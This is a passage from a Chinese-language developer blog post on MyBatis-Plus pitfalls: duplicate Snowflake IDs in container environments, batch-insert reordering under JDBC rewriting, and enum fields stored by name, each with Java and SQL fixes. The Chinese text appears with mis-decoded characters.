<h3 data-id="heading-7">3.3 é—®é¢˜æ ¹æº</h3>
<p>æˆ‘ä»¬æŠŠé›ªèŠ±IDé‡å¤çš„å…ƒå‡¶æ€»ç»“æˆå››ç±»ã€‚</p>
<h4 data-id="heading-8">3.3.1 å…ƒå‡¶ä¸€ï¼šæœªé…ç½®æœºå™¨IDï¼Œæ‰€æœ‰å®ä¾‹èµ°é»˜è®¤å€¼</h4>
<p>å¾ˆå¤šäººä»¥ä¸ºæ¡†æ¶ä¼šè‡ªåŠ¨ç®—å‡ºå”¯ä¸€çš„workerIdï¼Œäºæ˜¯å¹²è„†ä¸é…ã€‚ç»“æœå¤§å®¶éƒ½èµ°åŒä¸€ä¸ªé»˜è®¤æµç¨‹ã€‚</p>
<p><strong>MyBatis-Plusè·å–æœºå™¨IDçš„ç­–ç•¥</strong>ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9379840880d14a11ac86b0fc9e9eb751~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585237&amp;x-signature=rVo4DnTclRpO28wXZg4WktiHOOw%3D" alt="yBatis-Plusè·å–æœºå™¨IDçš„ç­–ç•¥" loading="lazy"/></p>
<p>çœ‹ä¼¼ä¸¥è°¨ï¼Œç„¶è€Œä¸€æ—¦è¿›å…¥ç¬¬äºŒæ­¥ï¼Œå®¹å™¨ç¯å¢ƒä¸‹â€œæ’è½¦â€æ¦‚ç‡ç›´çº¿ä¸Šå‡ã€‚</p>
<h4 data-id="heading-9">3.3.2 å…ƒå‡¶äºŒï¼šå®¹å™¨ç¯å¢ƒçš„MACåœ°å€å…‹éš†</h4>
<p>å…ˆçœ‹Dockerå®¹å™¨MACåœ°å€çš„è§„å¾‹ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-title class_">Docker</span>å®¹å™¨<span class="hljs-variable constant_">MAC</span>åœ°å€æ ¼å¼ï¼š<span class="hljs-number">02</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:XX</span>
                     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”œâ”€â”¤
                     å›ºå®šå‰ç¼€      å˜åŒ–éƒ¨åˆ†

å®¹å™¨<span class="hljs-number">1</span>ï¼š<span class="hljs-number">02</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">02</span>
å®¹å™¨<span class="hljs-number">2</span>ï¼š<span class="hljs-number">02</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">03</span>  
å®¹å™¨<span class="hljs-number">3</span>ï¼š<span class="hljs-number">02</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">04</span>
...
</code></pre>
<p>å¦‚æœç»§ç»­ä¾èµ–â€œå–åä¸¤å­—èŠ‚å†æ¨¡32â€çš„åšæ³•ï¼Œå°±ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼š</p>
<pre><code class="hljs language-ini" lang="ini">MACåœ°å€è®¡ç®—æµç¨‹ï¼š
1. æå–å2å­—èŠ‚ â†’ 00:02, 00:03, 00:04...
2. ä½è¿ç®—å¤„ç† â†’ å¾—åˆ°ä¸åŒçš„ä¸­é—´å€¼
3. æ¨¡32å–ä½™ â†’ é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œ

å®é™…ç»“æœï¼š
â”œâ”€ å®¹å™¨1-32ï¼šæœºå™¨<span class="hljs-attr">ID</span> = <span class="hljs-number">0</span>-<span class="hljs-number">31</span> âœ…
â”œâ”€ å®¹å™¨33ï¼šæœºå™¨<span class="hljs-attr">ID</span> = <span class="hljs-number">0</span> âŒ
â”œâ”€ å®¹å™¨34ï¼šæœºå™¨<span class="hljs-attr">ID</span> = <span class="hljs-number">1</span> âŒ
â””â”€ ä»¥æ­¤ç±»æ¨...
</code></pre>
<p>å¦‚æ­¤å¯è§ï¼Œåªè¦å®ä¾‹è¶…è¿‡32ä¸ªï¼Œå°±ä¸€å®šæœ‰é‡å¤ã€‚</p>
<h4 data-id="heading-10">3.3.3 å…ƒå‡¶ä¸‰ï¼šKubernetesç¯å¢ƒçš„è™šæ‹ŸMAC</h4>
<p>å†çœ‹K8sã€‚Podé‡Œçš„ç½‘ç»œæ¥å£æœ¬æ¥å°±æ˜¯è™šæ‹Ÿçš„ï¼ŒMACåœ°å€ç”±CNIéšæœºåˆ†é…ï¼Œè¿˜å¯èƒ½æ‹¿ä¸åˆ°ã€‚
Kubernetes Podç½‘ç»œç‰¹ç‚¹ï¼š</p>
<ol>
<li>æ¯ä¸ªPodéƒ½æœ‰è™šæ‹Ÿç½‘ç»œæ¥å£</li>
<li>MACåœ°å€ç”±CNIæ’ä»¶åˆ†é…</li>
<li>åŒä¸€èŠ‚ç‚¹çš„Podå¯èƒ½æ¨¡å¼ä¸€è‡´</li>
<li>æŸäº›ç¯å¢ƒä¸‹å¹²è„†æ‹¿ä¸åˆ°MAC
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63afa6655bd94b2ca6ac9bfd7dda7992~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585237&amp;x-signature=uGX5C86XExDhN7PM0P8614khjKk%3D" alt="yBatis-Plusè·å–æœºå™¨MACåœ°å€" loading="lazy"/></li>
</ol>
<p>è¿™ç§æƒ…å†µä¸‹ï¼Œ100ä¸ªPodå…¨ç”¨workerId=1ï¼Œå†²çªç›´æ¥æ‹‰æ»¡ã€‚</p>
<h4 data-id="heading-11">3.3.4 å…ƒå‡¶å››ï¼šæ—¶é’Ÿå›æ‹¨</h4>
<p>é›ªèŠ±ç®—æ³•éå¸¸ä¾èµ–ç³»ç»Ÿæ—¶é—´ã€‚ä¸€æ—¦æ—¶é’Ÿè¢«è°ƒå›ï¼Œå°±ä¼šé—¹å‡ºå¤§é—®é¢˜ã€‚</p>
<p>é›ªèŠ±IDç”Ÿæˆæµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ba1c288dbad43a4851c820f8e746720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585237&amp;x-signature=poCH4A8q1wGGZC2tuSp9QYgh4rE%3D" alt="é›ªèŠ±IDç”Ÿæˆæµç¨‹" loading="lazy"/>
ä½†æ˜¯ï¼Œå¦‚ä½•å‡ºç°æ—¶é’Ÿå›æ‹¨ï¼Œå°±ä¼šå‡ºç°å¦‚ä¸‹é—®é¢˜
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77e0b8d6b11f4e139f23c14a23bf4950~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585237&amp;x-signature=BRn6Hp0DE6X808TLRaksxNXnstY%3D" alt="æ—¶é’Ÿå›æ‹¨" loading="lazy"/></p>
<p>å½“ä»¥ä¸‹æ¡ä»¶åŒæ—¶æ»¡è¶³æ—¶ï¼Œé‡å¤å°±æ— å¯é¿å…ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">ç›¸åŒçš„æœºå™¨ID (<span class="hljs-attr">workerId</span>=<span class="hljs-number">1</span>)
ç›¸åŒçš„æ•°æ®ä¸­å¿ƒID (<span class="hljs-attr">datacenterId</span>=<span class="hljs-number">1</span>)  
ç›¸åŒçš„æ—¶é—´æˆ³ (<span class="hljs-attr">timestamp</span>=<span class="hljs-number">1634567890123</span>)
ç›¸åŒçš„åºåˆ—å· (<span class="hljs-attr">sequence</span>=<span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-12">3.4 è§£å†³æ–¹æ¡ˆï¼šç»™æ¯å°æœºå™¨ä¸€ä¸ªä¸“å±èº«ä»½è¯</h3>
<h4 data-id="heading-13">æ–¹æ¡ˆä¸€ï¼šå¤–éƒ¨è·å–å”¯ä¸€çš„åˆ†å¸ƒå¼ID</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdHelper</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>   <span class="hljs-type">long</span> <span class="hljs-title function_">getIdc</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> ZZIdcClient.getInstance().get();
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            log.error(<span class="hljs-string">"act=getIdc error={}"</span>, e.getMessage());
        }
        <span class="hljs-comment">// å…œåº•é€»è¾‘ï¼šä¸ºäº†ä¸å½±å“ä¸šåŠ¡ï¼Œå¦‚æœä»æ¶æ„æ‹¿ä¸åˆ°idï¼Œå°±é‡‡ç”¨IDHelper</span>
        <span class="hljs-comment">// IDHelperæœ‰é—®é¢˜ï¼Œå¹¶å‘æƒ…å†µä¸‹å¯èƒ½ä¼šç”Ÿæˆé‡å¤id</span>
        log.info(<span class="hljs-string">"k=s act=getIdcByIDHelper"</span>);
        <span class="hljs-keyword">return</span> IDHelper.generator(<span class="hljs-number">0</span>);
    }
}
</code></pre>
<h4 data-id="heading-14">æ–¹æ¡ˆäºŒï¼šä½¿ç”¨æ•°æ®åº“è‡ªå¢ID</h4>
<pre><code class="hljs language-java" lang="java">

<span class="hljs-keyword">package</span> com.baomidou.mybatisplus.annotation;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">IdType</span> {
    AUTO(<span class="hljs-number">0</span>),
    NONE(<span class="hljs-number">1</span>),
    INPUT(<span class="hljs-number">2</span>),
    ASSIGN_ID(<span class="hljs-number">3</span>),
    ASSIGN_UUID(<span class="hljs-number">4</span>),
    <span class="hljs-comment">/** <span class="hljs-doctag">@deprecated</span> */</span>
    <span class="hljs-meta">@Deprecated</span>
    ID_WORKER(<span class="hljs-number">3</span>),
    <span class="hljs-comment">/** <span class="hljs-doctag">@deprecated</span> */</span>
    <span class="hljs-meta">@Deprecated</span>
    ID_WORKER_STR(<span class="hljs-number">3</span>),
    <span class="hljs-comment">/** <span class="hljs-doctag">@deprecated</span> */</span>
    <span class="hljs-meta">@Deprecated</span>
    UUID(<span class="hljs-number">4</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> key;
}

    <span class="hljs-comment">/**
     * ä¸»é”®ID
     */</span>
    <span class="hljs-meta">@TableId(value = "id", type = IdType.AUTO)</span>
    <span class="hljs-keyword">private</span> Long id;
</code></pre>
<hr/>
<h2 data-id="heading-15">4ã€æ‰¹é‡æ’å…¥ä¹±åºé—®é¢˜</h2>
<h3 data-id="heading-16">4.1 é—®é¢˜ç°è±¡</h3>
<p>åœºæ™¯1ï¼šçˆ¶å­è®¢å•æ‰¹é‡æ’å…¥ã€‚å½“å­è®¢å•å‡†å¤‡å…¥åº“æ—¶ï¼Œçˆ¶è®¢å•è¿˜æ²¡å®Œæˆï¼Œå¤–é”®ç›´æ¥æŒ‚æ‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœŸæœ›ï¼šå…ˆæ’å…¥çˆ¶è®¢å•ï¼Œå†æ’å…¥å­è®¢å•</span>
heroPackageService.saveBatch(packages);  <span class="hljs-comment">// çˆ¶è®¢å•</span>
heroOrderService.saveBatch(orders);      <span class="hljs-comment">// å­è®¢å•</span>

<span class="hljs-comment">// ç»“æœï¼šå¤–é”®çº¦æŸå¤±è´¥ï¼</span>
<span class="hljs-comment">// Cannot add or update a child row: a foreign key constraint fails</span>
</code></pre>
<p>åœºæ™¯2ï¼šè¿œç¨‹æ¥å£è¿”å›ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œæˆ‘ä»¬å­˜åˆ°æ•°æ®åº“é‡Œï¼Œæƒ³åœ¨åç»­æŸ¥è¯¢ä¸­ä¿æŒåŸæœ‰é¡ºåºï¼Œç»“æœè¿˜æ˜¯ä¹±äº†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœŸæœ›ï¼šè¿œç¨‹è·å–æ•°æ®ä¹‹åï¼Œå­˜åœ¨æ•°æ®åº“ï¼Œåç»­ä»æ•°æ®åº“è·å–æœ‰åºåˆ—è¡¨çš„å¿«ç…§</span>
<span class="hljs-comment">//è¿œç¨‹è·å–å¤–éƒ¨æœ‰åºé›†åˆ</span>
List&lt;HeroPackage&gt; heroPackageList = recycleRpcService.getHeroPackageList(uid)
<span class="hljs-comment">//å°†è¿œç¨‹è·å–æ•°æ®å­˜å…¥æ•°æ®åº“</span>
heroPackageService.saveBatch(heroPackageList)
<span class="hljs-comment">//ä»æ•°æ®åº“è·å–æœ‰åºé›†åˆæ•°æ®</span>
List&lt;HeroPackage&gt; heroPackageList = heroPackageService.list(uid);


<span class="hljs-comment">// ç»“æœï¼šæœ‰åºé›†åˆçš„é¡ºåºè¢«æ‰“ä¹±</span>
<span class="hljs-comment">// </span>
</code></pre>
<p><strong>æ˜æ˜æ˜¯æŒ‰é¡ºåºè°ƒç”¨çš„ï¼Œä¸ºä»€ä¹ˆä¼šä¹±åºï¼Ÿ</strong></p>
<h3 data-id="heading-17">4.2 åŸç†</h3>
<p>å¯ä»¥æŠŠå®ƒæƒ³æˆå¿«é€’åˆ†æ‹£ã€‚ä½ æŒ‰é¡ºåºäº¤åŒ…è£¹ï¼Œåˆ†æ‹£ä¸­å¿ƒä¸ºäº†æ•ˆç‡ä¼šé‡æ’è·¯çº¿ï¼Œäºæ˜¯æœ€ç»ˆé¡ºåºå°±å˜äº†ã€‚</p>
<h4 data-id="heading-18">4.2.1 MyBatis-Plusçš„ä¸¤ç§æ‰¹é‡æ’å…¥æ¨¡å¼</h4>
<p>å®˜æ–¹å…¶å®æœ‰ä¸¤å¥—æ‰¹é‡é€»è¾‘ï¼Œå·®åˆ«éå¸¸å¤§ã€‚</p>
<h5 data-id="heading-19">æ¨¡å¼ä¸€ï¼šé»˜è®¤BATCHæ¨¡å¼ï¼ˆé€æ¡æ’å…¥ï¼‰</h5>
<p>MyBatis-Plusé»˜è®¤saveBatchçš„æ‰§è¡Œæµç¨‹ï¼š</p>
<ol>
<li>
<p>æ¥æ”¶æ•°æ®åˆ—è¡¨</p>
<ol>
<li>List packages (1000æ¡æ•°æ®)</li>
<li>é»˜è®¤æ‰¹æ¬¡å¤§å°ï¼š1000</li>
</ol>
</li>
<li>
<p>åˆ›å»ºæ‰¹å¤„ç†SqlSession</p>
<ol>
<li>ä½¿ç”¨ ExecutorType.BATCH</li>
<li>é€æ¡æ‰§è¡ŒINSERT</li>
</ol>
</li>
<li>
<p>é€æ¡åŠ å…¥æ‰¹å¤„ç†é˜Ÿåˆ—</p>
<ol>
<li>ç¬¬1æ¡ï¼šINSERT INTO hero_package VALUES (...)</li>
<li>ç¬¬2æ¡ï¼šINSERT INTO hero_package VALUES (...)</li>
<li>...</li>
<li>ç¬¬1000æ¡ï¼šINSERT INTO hero_package VALUES (...)</li>
</ol>
</li>
<li>
<p>è¾¾åˆ°æ‰¹æ¬¡å¤§å°å flushStatements()</p>
</li>
</ol>
<p>ç‰¹ç‚¹ï¼š</p>
<ol>
<li>æ”¯æŒä¸»é”®å›å¡«</li>
<li>å•çº¿ç¨‹ä¸‹é¡ºåºå¯æ§</li>
<li>å¤šçº¿ç¨‹+é©±åŠ¨ä¼˜åŒ–åå®¹æ˜“ä¹±åº</li>
<li>ç½‘ç»œå¾€è¿”æ¬¡æ•°å¤šï¼Œæ€§èƒ½ä¸€èˆ¬</li>
</ol>
<h5 data-id="heading-20">æ¨¡å¼äºŒï¼šä¼˜åŒ–æ‰¹å¤„ç†æ¨¡å¼ï¼ˆåˆå¹¶SQLï¼‰</h5>
<p>é…ç½®æ–¹å¼ï¼šè¦ä¹ˆæ”¹å…¨å±€é…ç½®ï¼Œè¦ä¹ˆå†™è‡ªå®šä¹‰SQL</p>
<p>æ‰§è¡Œæµç¨‹ï¼š</p>
<ol>
<li>æ¥æ”¶åˆ—è¡¨</li>
<li>foreachæ‹¼æˆä¸€æ¡å¤šå€¼INSERT</li>
<li>ä¸€æ¬¡æ€§è½åº“</li>
</ol>
<p>ç‰¹ç‚¹ï¼š</p>
<ol>
<li>å•æ¬¡å¾€è¿”ï¼Œæ€§èƒ½é«˜</li>
<li>é¡ºåºå®Œå…¨å¯æ§</li>
<li>ä¸»é”®éœ€è¦è‡ªå·±å‡†å¤‡</li>
<li>SQLè¿‡é•¿æ—¶å¾—è‡ªè¡Œåˆ†æ‰¹</li>
</ol>
<p><strong>ä¸¤ç§æ¨¡å¼å¯¹æ¯”</strong>ï¼š</p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>é»˜è®¤BATCHæ¨¡å¼</th><th>ä¼˜åŒ–æ‰¹å¤„ç†æ¨¡å¼</th></tr></thead><tbody><tr><td>æ€§èƒ½</td><td>å¤šæ¬¡å¾€è¿”ï¼Œé€Ÿåº¦ä¸€èˆ¬</td><td>å•æ¬¡å¾€è¿”ï¼Œæå¿«</td></tr><tr><td>é¡ºåºä¿è¯</td><td>å•çº¿ç¨‹å¯æ§ï¼Œå¤šçº¿ç¨‹ä¸ç¨³</td><td>å®Œå…¨å¯æ§</td></tr><tr><td>ä¸»é”®å›å¡«</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ä¾èµ–æ•°æ®åº“ç”Ÿæˆä¸»é”®</td><td>è‡ªå·±èƒ½ç”Ÿæˆä¸»é”®æˆ–æ— ä¸»é”®éœ€æ±‚</td></tr></tbody></table>
<h4 data-id="heading-21">4.2.2 æ ¹æœ¬åŸå› äºŒï¼šJDBCé©±åŠ¨çš„æ‰¹å¤„ç†é‡æ’åº</h4>
<p>MySQL JDBCé©±åŠ¨ä¸ºäº†æé€Ÿï¼Œä¼šæŠŠåŒè¡¨æ“ä½œåˆå¹¶ã€‚åŸæœ¬äº¤é”™çš„SQLè¢«é‡æ–°åˆ†ç»„ï¼Œé¡ºåºè‡ªç„¶å°±ä¹±äº†ã€‚</p>
<p>JDBCæ‰¹å¤„ç†æ¨¡å¼ï¼š</p>
<p>æ¨¡å¼1ï¼šrewriteBatchedStatements=false</p>
<ol>
<li>é€æ¡æ‰§è¡Œ</li>
<li>é¡ºåºç¨³å®š</li>
<li>æ€§èƒ½ä¸€èˆ¬</li>
</ol>
<p>æ¨¡å¼2ï¼šrewriteBatchedStatements=true</p>
<ol>
<li>è‡ªåŠ¨åˆå¹¶SQL</li>
<li>æ€§èƒ½é£™å‡</li>
<li>é¡ºåºå¯èƒ½è¢«â€œä¼˜åŒ–â€</li>
</ol>
<pre><code class="hljs language-sql" lang="sql">
ä¾‹å­ï¼š
åŸå§‹<span class="hljs-keyword">SQL</span>ï¼š
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_package <span class="hljs-keyword">VALUES</span> (..)
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_order <span class="hljs-keyword">VALUES</span> (..)
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_package <span class="hljs-keyword">VALUES</span> (..)
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_order <span class="hljs-keyword">VALUES</span> (..)

é©±åŠ¨ä¼˜åŒ–åï¼š
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_package <span class="hljs-keyword">VALUES</span> (...), (...)
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hero_order <span class="hljs-keyword">VALUES</span> (...), (...)

</code></pre>
<p>é¡ºåºå½»åº•å˜äº†ã€‚</p>
<h4 data-id="heading-22">4.2.3 æ ¹æœ¬åŸå› ä¸‰ï¼šæ•°æ®åº“å±‚é¢çš„æ‰§è¡Œä¼˜åŒ–</h4>
<p>MySQLä¼˜åŒ–å™¨ä¹Ÿä¼šâ€œå¸®å¿™â€é‡æ’æ‰§è¡Œè®¡åˆ’ã€‚åŒä¸€å¼ è¡¨çš„æ“ä½œè¢«é›†ä¸­ï¼Œé¿å…é¢‘ç¹åˆ‡æ¢è¡¨ï¼Œæ€§èƒ½æ˜¯å¥½äº†ï¼Œä½†ä¾èµ–é¡ºåºçš„é€»è¾‘ç›´æ¥å´©ã€‚</p>
<pre><code class="hljs language-sql" lang="sql">æœŸæœ›ï¼š
Package1 â†’ Order1 â†’ Package2 â†’ Order2

å®é™…ï¼š
Package1, Package2 â†’ Order1, Order2

ä¼˜åŒ–å™¨å¿ƒå£°ï¼š
æ—¢ç„¶éƒ½æ˜¯<span class="hljs-keyword">INSERT</span>ï¼Œå°±åˆ†ç»„å§
çœå¾—æ¥å›åˆ‡æ¢è¡¨         
</code></pre>
<p>é—®é¢˜åœ¨äºï¼ŒOrderå¼•ç”¨Packageçš„ä¸»é”®ã€‚å¦‚æœPackageè¿˜æ²¡è½åº“ï¼ŒOrderæ’å…¥å¿…å¤±è´¥ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢çš„çœŸå®æ¡ˆä¾‹ã€‚ä¸¤ä¸ªçº¿ç¨‹å¹¶å‘åˆ›å»ºè®¢å•ã€‚æ‰¹å¤„ç†æ—¶é˜Ÿåˆ—ä¸ä¿è¯FIFOï¼Œäºæ˜¯è®¢å•é¡¹å’Œè®¢å•çš„å…³ç³»å…¨ä¹±å¥—ã€‚</p>
<p>æœŸæœ›ï¼š
è®¢å•A â†’ è®¢å•é¡¹A â†’ è®¢å•B â†’ è®¢å•é¡¹B</p>
<p>ç°å®ï¼š
çº¿ç¨‹Aã€çº¿ç¨‹BåŒæ—¶å†™å…¥
æ‰¹å¤„ç†é˜Ÿåˆ—äº¤é”™
é©±åŠ¨/æ•°æ®åº“é‡æ’
â†’ å¯èƒ½å…ˆæ‰§è¡Œçº¿ç¨‹Bçš„è®¢å•é¡¹ï¼Œå†æ‰§è¡Œçº¿ç¨‹Açš„
â†’ å¤–é”®å’Œä¸šåŠ¡é€»è¾‘å…¨ä¹±</p>
<h3 data-id="heading-23">4.3 è§£å†³æ–¹æ¡ˆï¼šæ§åˆ¶æ‰¹å¤„ç†èŠ‚å¥</h3>
<p>æˆ‘ä»¬å¸¸ç”¨ä¸¤ä¸ªæ€è·¯ï¼šè¦ä¹ˆâ€œåˆ†æ‰¹+å¼ºåˆ¶åˆ·æ–°â€ï¼Œè¦ä¹ˆâ€œè‡ªå®šä¹‰SQLä¸€æ¬¡å†™å®Œâ€ã€‚</p>
<h4 data-id="heading-24">æ–¹æ¡ˆä¸€ï¼šåˆ†æ‰¹æ¬¡æ‰§è¡Œï¼Œå¼ºåˆ¶åˆ·æ–°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrdersInSequence</span><span class="hljs-params">(List&lt;OrderData&gt; orderDataList)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">batchSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; orderDataList.size(); i += batchSize) {
        List&lt;OrderData&gt; batch = orderDataList.subList(i, 
            Math.min(i + batchSize, orderDataList.size()));
        
        <span class="hljs-comment">// å…ˆæ’å…¥çˆ¶è®¢å•</span>
        List&lt;HeroPackage&gt; packages = buildPackages(batch);
        heroPackageService.saveBatch(packages);
        sqlSession.flushStatements(); <span class="hljs-comment">// å¼ºåˆ¶æ‰§è¡Œï¼Œç¡®ä¿é¡ºåº</span>
        
        <span class="hljs-comment">// å†æ’å…¥å­è®¢å•</span>
        List&lt;HeroOrder&gt; orders = buildOrders(batch);
        heroOrderService.saveBatch(orders);
        sqlSession.flushStatements();
    }
}
</code></pre>
<h4 data-id="heading-25">æ–¹æ¡ˆäºŒï¼šè‡ªå®šä¹‰SQLï¼Œä¸€æ¬¡æ€§æ’å…¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰SQLï¼Œå®Œå…¨æ§åˆ¶æ‰§è¡Œé¡ºåº</span>
<span class="hljs-meta">@Insert({
    "&lt;script&gt;",
    "INSERT INTO hero_package (id, seller_uid, create_time) VALUES ",
    "&lt;foreach collection='packages' item='pkg' separator=','&gt;",
    "(#{pkg.id}, #{pkg.sellerUid}, #{pkg.createTime})",
    "&lt;/foreach&gt;",
    "&lt;/script&gt;"
})</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">insertPackageBatch</span><span class="hljs-params">(<span class="hljs-meta">@Param("packages")</span> List&lt;HeroPackage&gt; packages)</span>;
</code></pre>
<hr/>
<h2 data-id="heading-26">5ã€æšä¸¾å­—æ®µå­˜å‚¨é£é™©</h2>
<h3 data-id="heading-27">5.1 é—®é¢˜ç°è±¡ï¼šæšä¸¾å­—æ®µå­˜å‚¨å¼‚å¸¸</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æšä¸¾å®šä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">OrderStatus</span> {
    PENDING(<span class="hljs-number">1</span>, <span class="hljs-string">"å¾…å¤„ç†"</span>),
    PROCESSING(<span class="hljs-number">2</span>, <span class="hljs-string">"å¤„ç†ä¸­"</span>),
    COMPLETED(<span class="hljs-number">3</span>, <span class="hljs-string">"å·²å®Œæˆ"</span>);
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Integer code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;
}

<span class="hljs-comment">// å®ä½“ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeroOrder</span> {
    <span class="hljs-keyword">private</span> OrderStatus orderStatus; <span class="hljs-comment">// æœŸæœ›å­˜å‚¨codeå€¼(1,2,3)</span>
}

<span class="hljs-comment">// ç»“æœï¼šæ•°æ®åº“ä¸­å­˜å‚¨çš„æ˜¯æšä¸¾åç§°("PENDING", "PROCESSING", "COMPLETED")</span>
</code></pre>
<h3 data-id="heading-28">5.2 æ·±å…¥åŸç†ï¼šMyBatisçš„é»˜è®¤æšä¸¾å¤„ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// MyBatisé»˜è®¤çš„æšä¸¾å¤„ç†å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnumTypeHandler</span>&lt;E <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Enum</span>&lt;E&gt;&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;E&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, E parameter, JdbcType jdbcType)</span> {
        <span class="hljs-comment">// é»˜è®¤ä½¿ç”¨æšä¸¾çš„name()æ–¹æ³•ï¼</span>
        ps.setString(i, parameter.name()); <span class="hljs-comment">// å­˜å‚¨"PENDING"è€Œä¸æ˜¯1</span>
    }
}
</code></pre>
<h3 data-id="heading-29">5.3 è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨@EnumValueæ³¨è§£</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">OrderStatus</span> {
    PENDING(<span class="hljs-number">1</span>, <span class="hljs-string">"å¾…å¤„ç†"</span>),
    PROCESSING(<span class="hljs-number">2</span>, <span class="hljs-string">"å¤„ç†ä¸­"</span>),
    COMPLETED(<span class="hljs-number">3</span>, <span class="hljs-string">"å·²å®Œæˆ"</span>);
    
    <span class="hljs-meta">@EnumValue</span> <span class="hljs-comment">// æ ‡è®°è¿™ä¸ªå­—æ®µç”¨äºæ•°æ®åº“å­˜å‚¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Integer code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;
    
    <span class="hljs-comment">// æ„é€ å‡½æ•°å’Œgetter...</span>
}
</code></pre>
